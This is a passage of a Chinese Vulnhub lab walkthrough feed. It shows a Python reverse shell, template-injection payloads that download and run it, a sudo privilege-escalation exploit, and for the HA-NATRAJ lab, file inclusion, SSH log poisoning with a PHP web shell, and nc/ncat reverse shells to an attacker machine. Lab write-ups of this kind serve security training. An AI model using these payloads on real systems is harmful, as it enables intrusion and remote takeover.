+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">sys&lt;/span>, &lt;span style="color:#008b45;text-decoration:underline">socket&lt;/span>, &lt;span style="color:#008b45;text-decoration:underline">subprocess&lt;/span>, &lt;span style="color:#008b45;text-decoration:underline">os&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>port = &lt;span style="color:#658b00">int&lt;/span>(sys.argv[&lt;span style="color:#b452cd">1&lt;/span>])
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.connect((&lt;span style="color:#cd5555">&amp;#39;10.0.2.15&amp;#39;&lt;/span>, port))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>os.dup2(s.fileno(), &lt;span style="color:#b452cd">0&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>os.dup2(s.fileno(), &lt;span style="color:#b452cd">1&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>os.dup2(s.fileno(), &lt;span style="color:#b452cd">2&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p = subprocess.call([&lt;span style="color:#cd5555">&amp;#34;/bin/sh&amp;#34;&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;-i&amp;#34;&lt;/span>])
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22"># 下载&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; open
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Title: &lt;span style="color:#b452cd">8&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Description: {{request.application.__globals__.__builtins__.__import__(&lt;span style="color:#cd5555">&amp;#39;os&amp;#39;&lt;/span>).popen(&lt;span style="color:#cd5555">&amp;#39;wget http://10.0.2.15/reverse/r.py -O r.py&amp;#39;&lt;/span>).read()}}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22"># 运行&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; open
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Title: &lt;span style="color:#b452cd">9&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Description: {{request.application.__globals__.__builtins__.__import__(&lt;span style="color:#cd5555">&amp;#39;os&amp;#39;&lt;/span>).popen(&lt;span style="color:#cd5555">&amp;#39;python3.6 r.py 444&amp;#39;&lt;/span>).read()}}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="获得权限">获得权限&lt;/h2>
+&lt;h3 id="靶机测试">靶机测试&lt;/h3>
+&lt;p>本地监听，点击5000端口的链接，获得反弹shells&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/492/3.webp" alt="3">&lt;/p>
+&lt;h2 id="提权">提权&lt;/h2>
+&lt;p>使用CVE-2021-3156提权&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ git clone https://github.com/worawit/CVE-2021-3156
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">cd&lt;/span> CVE-2021-3156
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ python exploit_nss.py
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/492/4.webp" alt="4">&lt;/p>- https://www.vulnhub.cn/walkthrough/492/ - This is a customized copyright.</description></item><item><title>Vulnhub 489 HA-NATRAJ</title><link>https://www.vulnhub.cn/walkthrough/489/</link><pubDate>Thu, 04 Jun 2020 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/489/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/489/ -&lt;p>考点：文件包含、权限继承、lua&lt;/p>
+&lt;p>靶机链接：https://www.vulnhub.com/entry/ha-natraj,489/&lt;/p>
+&lt;h2 id="环境配置">环境配置&lt;/h2>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>名称&lt;/th>
+&lt;th>IP&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Kali Linux&lt;/td>
+&lt;td>10.0.2.15&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>natraj&lt;/td>
+&lt;td>10.0.2.6&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;p>VirtualBox直接导入无法获得IP，解决方法见**&lt;a href="https://www.iihack.com/2022/08/08/vulnhub-vm-ip.html">Vulnhub靶机无法获得IP&lt;/a>**。&lt;/p>
+&lt;h2 id="初步打点">初步打点&lt;/h2>
+&lt;h3 id="端口扫描">端口扫描&lt;/h3>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">rip&lt;/span>=10.0.2.6
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ nmap -v -A -p- &lt;span style="color:#00688b">$rip&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">2048&lt;/span> d9:9f:da:f4:2e:67:01:92:d5:da:7f:70:d0:06:b3:92 (RSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">256&lt;/span> bc:ea:f1:3b:fa:7c:05:0c:92:95:92:e9:e7:d2:07:71 (ECDSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#b452cd">256&lt;/span> f0:24:5b:7a:3b:d6:b7:94:c4:4b:fe:57:21:f8:00:61 (ED25519)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: HA:Natraj
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET POST OPTIONS HEAD
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.29 (Ubuntu)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>看来漏洞大概率只能出在web应用上了。&lt;/p>
+&lt;h3 id="web测试">WEB测试&lt;/h3>
+&lt;p>查看源代码，全静态，看看有没有二级目录&lt;/p>
+&lt;h4 id="dirb">dirb&lt;/h4>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ dirb http://10.0.2.6/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-----------------
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>URL_BASE: http://10.0.2.6/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-----------------
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GENERATED WORDS: &lt;span style="color:#b452cd">4612&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>---- Scanning URL: http://10.0.2.6/ ----
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>==&amp;gt; DIRECTORY: http://10.0.2.6/console/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>==&amp;gt; DIRECTORY: http://10.0.2.6/images/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ http://10.0.2.6/index.html (CODE:200|SIZE:14497)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ http://10.0.2.6/server-status (CODE:403|SIZE:273)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="dirsearch">dirsearch&lt;/h4>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ dirsearch -u http://10.0.2.6/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: &lt;span style="color:#b452cd">30&lt;/span> | Wordlist size: &lt;span style="color:#b452cd">10927&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Target: http://10.0.2.6/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[04:01:31] Starting:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[04:01:51] &lt;span style="color:#b452cd">301&lt;/span> - 306B - /console -&amp;gt; http://10.0.2.6/console/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[04:01:51] &lt;span style="color:#b452cd">200&lt;/span> - 936B - /console/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[04:01:56] &lt;span style="color:#b452cd">200&lt;/span> - 5KB - /images/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[04:01:56] &lt;span style="color:#b452cd">301&lt;/span> - 305B - /images -&amp;gt; http://10.0.2.6/images/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[04:01:56] &lt;span style="color:#b452cd">200&lt;/span> - 14KB - /index.html
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[04:02:12] &lt;span style="color:#b452cd">403&lt;/span> - 273B - /server-status/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[04:02:13] &lt;span style="color:#b452cd">403&lt;/span> - 273B - /server-status
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Task Completed
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>发现存在console目录&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/489/1.webp" alt="1">&lt;/p>
+&lt;h3 id="漏洞发现">漏洞发现&lt;/h3>
+&lt;p>访问&lt;code>http://10.0.2.6/console/file.php&lt;/code>页面空白，盲猜这里有个file参数，可能存在本地文件包含LFI。&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>http://10.0.2.6/console/file.php?file=/etc/passwd
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/489/2.webp" alt="2">&lt;/p>
+&lt;h2 id="获得权限">获得权限&lt;/h2>
+&lt;p>尝试包含&lt;code>/var/log/apache2/access.log&lt;/code>等失败，发现包含&lt;code>/var/log/auth.log&lt;/code>成功了&lt;/p>
+&lt;h3 id="本地测试">本地测试&lt;/h3>
+&lt;p>测试写入&lt;code>/var/log/auth.log&lt;/code>文件&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ssh &lt;span style="color:#cd5555">&amp;#39;&amp;lt;?php system($_GET[123]);?&amp;gt;&amp;#39;&lt;/span>@127.0.0.1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/489/3.webp" alt="3">&lt;/p>
+&lt;p>看效果写入成功&lt;/p>
+&lt;h3 id="靶机测试">靶机测试&lt;/h3>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ssh &lt;span style="color:#cd5555">&amp;#39;&amp;lt;?php system($_GET[123]);?&amp;gt;&amp;#39;&lt;/span>@10.0.2.6
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/489/4.webp" alt="4">&lt;/p>
+&lt;p>&lt;code>http://10.0.2.6/console/file.php?file=/var/log/auth.log&amp;amp;123=nc 10.0.2.15 444&lt;/code>创建了端口连接，但是&lt;code>http://10.0.2.6/console/file.php?file=/var/log/auth.log&amp;amp;123=nc 10.0.2.15 444 -e /bin/sh&lt;/code>失败了，说明这个靶机的&lt;code>nc&lt;/code>没有&lt;code>-e&lt;/code>参数&lt;/p>
+&lt;h4 id="思路一">思路一&lt;/h4>
+&lt;p>可使用ncat代替nc&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a61717;background-color:#e3d2d2">http://10.0.2.6/console/file.php?file=/var/log/auth.log&amp;amp;123=ncat 10.0.2.15 444 -e /bin/bash
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>成功接收反弹&lt;/p>
+&lt;h4 id="思路二">思路二&lt;/h4>
+&lt;p>写一句话文件&lt;/p>
+&lt;p>在auth.log发现目录&lt;code>/var/www/html/console&lt;/code>&lt;/p>
+&lt;p>使用python快速本地起http服务&lt;code>python -m 'http.server' 80&lt;/code>&lt;/p>
+&lt;p>尝试下载文件写入目录&lt;code>/var/www/html/console/&lt;/code>写入失败&lt;/p>
+&lt;p>尝试下载文件写入目录&lt;code>/var/www/html/&lt;/code>写入成功&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
